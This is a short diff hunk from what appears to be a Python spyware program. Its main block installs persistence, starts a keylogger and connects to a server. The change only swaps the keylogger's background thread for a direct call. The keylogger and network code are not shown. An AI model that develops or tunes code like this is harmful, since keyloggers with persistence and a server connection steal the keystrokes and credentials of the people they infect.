@@ -141,6 +141,6 @@ def connect_to_server():
 if __name__ == "__main__":
 
     make_persistent()
-    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
-    keylogger_thread.start()
+    start_keylogger()
+
     connect_to_server()
